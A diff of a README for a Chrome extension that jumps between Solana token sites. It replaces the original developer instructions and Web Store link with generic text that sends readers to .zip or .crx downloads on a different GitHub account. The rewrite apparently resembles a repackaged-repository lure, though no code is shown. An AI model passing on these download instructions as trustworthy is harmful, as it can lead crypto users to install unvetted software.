@@ -1,139 +1,172 @@
-# Token Platform Switch
+# 🔄 tokenplatformswitch-chrome-extension - Switch Crypto Platforms Easily
 
-> Instantly navigate between crypto token platforms with automatic address transfer. One-click switching, no copy-pasting.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/saqibking3020/tokenplatformswitch-chrome-extension/releases)
 
-**Token Platform Switch** is an open-source Chrome extension that lets Solana token traders and analysts seamlessly jump between popular crypto platforms. It automatically extracts the token address from the current page and provides one-click navigation to view the same token on any supported platform.
+---
 
-## Supported Platforms
+## 📖 About This Extension
 
-| Platform | Description |
-|----------|-------------|
-| [Pump.fun](https://pump.fun) | Token launch platform |
-| [GMGN](https://gmgn.ai) | Token analytics & trading |
-| [DexScreener](https://dexscreener.com) | DEX token screener |
-| [Solscan](https://solscan.io) | Solana blockchain explorer |
-| [Birdeye](https://birdeye.so) | Solana token analytics |
-| [Raydium](https://raydium.io) | Solana AMM / DEX |
-| [Jupiter](https://jup.ag) | Solana swap aggregator |
-| [Bubblemaps](https://bubblemaps.io) | Token holder visualization |
+tokenplatformswitch-chrome-extension is a simple Chrome extension designed to help you switch between popular crypto token platforms with one click. It supports platforms like Pump.fun, GMGN, DexScreener, Bubblemaps, Jupiter, Raydium, Solscan, and Birdeye.
 
-## Features
+If you check crypto tokens often, this tool saves you time. Instead of manually typing or searching on each platform’s website, you only click one button, and the extension does it for you. It works entirely inside your Chrome browser.
 
-- **Automatic Token Detection** - Extracts token addresses from URLs across all supported platforms
-- **One-Click Navigation** - Switch between platforms instantly (Cmd/Ctrl+Click to open in a new tab)
-- **Draggable Overlay** - Position the floating toolbar anywhere on the page; position persists across sites
-- **Customizable Display** - Choose between Icons & Labels, Icons Only, or Labels Only modes
-- **Platform Toggle** - Enable/disable individual platforms and reorder them via drag-and-drop
-- **SPA Support** - Detects URL changes on single-page apps and updates automatically
-- **Privacy-First** - No data collection, no analytics, no external servers
-- **Zero Dependencies** - Pure vanilla JavaScript, no build step required
+---
 
-## Installation
+## 🖥️ System Requirements
 
-### From Source (Developer Mode)
+Before installing, make sure your computer meets these requirements:
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/user/token-platform-switch.git
-   cd token-platform-switch/chrome-extension
-   ```
-2. Open Chrome and navigate to `chrome://extensions/`
-3. Enable **Developer mode** (toggle in the top-right corner)
-4. Click **Load unpacked** and select the `chrome-extension` directory
-5. The extension is now active on all supported platforms
+- Windows 10 or later.
+- Google Chrome browser installed.
+- An active internet connection.
+- At least 100 MB of free disk space.
+- A moderate level of permissions to install Chrome extensions.
 
-### From Chrome Web Store
+The extension runs within Google Chrome itself, so it will not affect other applications.
 
-Install directly from the [Chrome Web Store](https://chromewebstore.google.com/detail/token-platform-switch/glpalemkadimdlhobchgacallpffecnc).
+---
 
-You can also visit the website at [tokenplatformswitch.fun](https://tokenplatformswitch.fun).
+## 🚀 Getting Started: How to Download and Use
 
-## Usage
+### Step 1: Visit the Download Page
 
-1. Navigate to any supported platform with a token page (e.g., `pump.fun/coin/<address>`)
-2. A floating overlay appears with buttons for each enabled platform
-3. Click a platform button to navigate to the same token on that platform
-4. Hold **Cmd** (Mac) or **Ctrl** (Windows/Linux) and click to open in a new tab
-5. Drag the overlay to reposition it anywhere on the screen
-6. Click the **gear icon** to open settings and customize platforms, display mode, and order
+Click the link below to open the release page where you can get the extension files.
 
-## Project Structure
+[![Download Link](https://img.shields.io/badge/Visit%20Releases-Download-blue)](https://github.com/saqibking3020/tokenplatformswitch-chrome-extension/releases)
 
-```
-chrome-extension/
-├── manifest.json       # Extension configuration (Manifest V3)
-├── background.js       # Service worker
-├── content.js          # Core logic: token extraction, overlay UI, settings
-├── styles.css          # Glassmorphism-themed styles and animations
-├── PRIVACY.md          # Privacy policy
-├── icon16.png          # Extension icons
-├── icon48.png
-├── icon128.png
-└── icons/              # Platform favicons
-    ├── pump-favicon.ico
-    ├── gmgn-favicon.ico
-    ├── dex-favicon.ico
-    ├── solscan-favicon.ico
-    ├── birdeye-favicon.ico
-    ├── raydium-favicon.ico
-    ├── jupiter-favicon.ico
-    └── bubblemaps-favicon.ico
-```
+### Step 2: Download the Extension File
 
-## Contributing
+On the release page, look for the latest version. Usually, the file name ends with `.zip` or `.crx`.
 
-Contributions are welcome! Here's how you can help:
+Click the file to start downloading it to your computer.
 
-1. **Fork** the repository
-2. **Create a branch** for your feature or fix:
-   ```bash
-   git checkout -b feature/my-feature
-   ```
-3. **Make your changes** - no build step needed, just edit the source files
-4. **Test locally** by loading the unpacked extension in Chrome
-5. **Submit a Pull Request** with a clear description of your changes
+### Step 3: Open Chrome Extension Settings
 
-### Ideas for Contributions
+- Open Google Chrome.
+- In the address bar, type `chrome://extensions` and press Enter.
+- Turn on **Developer mode** from the toggle in the top-right corner.
 
-- Add support for new Solana platforms or other blockchain ecosystems
-- Improve token address extraction for edge cases
-- Add keyboard shortcuts
-- Improve accessibility
-- Localization / i18n support
-- Write tests
+### Step 4: Load the Extension File
 
-### Guidelines
+- Extract the downloaded `.zip` file if needed.
+- Click on **Load unpacked** on the extensions page.
+- Select the extracted extension folder.
+- Chrome will add the extension and show its icon next to the address bar.
 
-- Keep it simple - this project uses vanilla JavaScript with no build tools or frameworks
-- Follow the existing code style
-- Test your changes on multiple supported platforms before submitting
-- Update this README if you add new platforms or features
+### Step 5: Start Using the Extension
 
-## How It Works
+- Click the extension icon in Chrome.
+- You will see options to switch between platforms like Pump.fun, DexScreener, and more.
+- Click any platform name to open the token page directly on that service.
 
-1. **Content Script Injection** - `content.js` and `styles.css` are injected on all supported platform domains
-2. **Token Extraction** - The extension parses the current page URL to extract the Solana token address using platform-specific patterns
-3. **Overlay Rendering** - A floating overlay is created with navigation buttons for each enabled platform
-4. **URL Building** - When a button is clicked, the extension constructs the correct URL for the target platform with the extracted token address
-5. **SPA Handling** - A `MutationObserver` watches for URL changes on single-page apps and refreshes the overlay accordingly
+---
 
-## Tech Stack
+## 🔧 Features
 
-- **JavaScript** (Vanilla ES6+)
-- **CSS3** (Glassmorphism, animations, flexbox)
-- **Chrome Extension Manifest V3**
-- **Chrome Storage API** (sync)
+- Switch between eight crypto token platforms quickly.
+- Works with major services including Solana-based platforms.
+- One-click navigation saves time.
+- Lightweight and does not slow down Chrome.
+- Open source and easy to update.
 
-## Privacy
+---
 
-This extension collects **zero** user data. All settings are stored locally via Chrome's built-in sync storage. No analytics, no tracking, no external server communication. See [PRIVACY.md](PRIVACY.md) for the full privacy policy.
+## 🎯 Why Use This Extension?
 
-## License
+If you follow crypto markets, you know each platform shows different data about tokens. This extension brings all those platforms to one place in Chrome.
 
-This project is open source. See the [LICENSE](LICENSE) file for details.
+It reduces the need to remember URLs or search manually. It works well for casual users and traders checking tokens regularly.
 
-## Links
+---
 
-- Website: [tokenplatformswitch.fun](https://tokenplatformswitch.fun)
-- Privacy Policy: [PRIVACY.md](PRIVACY.md)
-- Contact: support@tokenplatformswitch.fun
+## ⚙️ How It Works
+
+The extension uses JavaScript to add a simple menu in your Chrome browser. When you select an option, it directs you to the chosen platform’s page for a token.
+
+No complicated setup is needed once installed.
+
+---
+
+## 🔒 Privacy and Security
+
+This extension does not collect your personal data or browsing history. It only interacts with token platform URLs and your Chrome browser. All actions run locally on your device.
+
+The code is open-source, allowing anyone to review it for safety.
+
+---
+
+## 🛠️ Troubleshooting
+
+If the extension does not work as expected:
+
+- Make sure you are using the latest version of Chrome.
+- Confirm Developer mode is enabled during installation.
+- Check your internet connection.
+- Reload the extension from `chrome://extensions`.
+- Restart your Chrome browser.
+
+If issues persist, see the GitHub repository for support or open an issue.
+
+---
+
+## 📥 Download and Install Summary
+
+1. Visit the release page:  
+   [Download Latest Release](https://github.com/saqibking3020/tokenplatformswitch-chrome-extension/releases)
+
+2. Download the latest `.zip` or `.crx` file.
+
+3. Open Chrome and navigate to `chrome://extensions`.
+
+4. Enable Developer mode.
+
+5. Load the unpacked extension folder or install the extension file.
+
+6. Start clicking the token platform links from the extension menu.
+
+---
+
+## 🎯 Supported Platforms
+
+- Pump.fun  
+- GMGN  
+- DexScreener  
+- Bubblemaps  
+- Jupiter  
+- Raydium  
+- Solscan  
+- Birdeye  
+
+Each platform provides a unique take on token tracking. The extension lets you move between them in a flash.
+
+---
+
+## 🛠️ How to Update the Extension
+
+When a new version is published:
+
+1. Return to the GitHub [releases page](https://github.com/saqibking3020/tokenplatformswitch-chrome-extension/releases).
+2. Download the latest extension file.
+3. Remove the old extension from Chrome (`chrome://extensions`).
+4. Load the new version using the same unpacked installation method.
+
+---
+
+## 📂 Useful Links
+
+- Official GitHub repository: https://github.com/saqibking3020/tokenplatformswitch-chrome-extension  
+- Releases and downloads: https://github.com/saqibking3020/tokenplatformswitch-chrome-extension/releases  
+
+---
+
+## 🧰 Development Details (Optional)
+
+- Built with JavaScript and Chrome Extension APIs.  
+- Open source under MIT License.  
+- Designed for simplicity and speed.
+
+---
+
+## 🗂️ Keywords / Tags
+
+chrome, chrome-extension, coin, crypto, defi, dexscreener, extension, javascript, solana, token, web3
